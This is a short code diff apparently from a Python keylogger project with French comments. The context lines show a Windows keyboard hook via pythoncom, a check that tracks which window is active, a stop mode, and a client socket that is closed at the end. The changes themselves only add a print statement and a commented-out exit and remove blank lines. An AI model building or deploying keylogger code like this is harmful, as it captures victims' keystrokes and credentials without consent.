@@ -44,6 +44,8 @@ def Keylloger():
     #register the hook and execute forever
     k1.HookKeyboard()
     pythoncom.PumpMessages()
+    print("Fin du keylogger")
+
 
     ## Fonction keylloger ##
 
@@ -86,6 +88,8 @@ def Keystroke(event ):
     ##Couper le keylogger
     if keylogger_mode == "stop":
         ctypes.windll.user32.PostQuitMessage(0)
+        
+        #exit()
     #check to see if target changed windows
     if event.WindowName != current_window :
         current_window = event.WindowName
@@ -289,11 +293,7 @@ while True:
     #ClientSocket.send(str.encode(Input))
     #Response = ClientSocket.recv(1024)
     #print(Response.decode('utf-8'))
-
-
-
-
-
+    
 ## Fin de Connection ##
 
 ClientSocket.close()
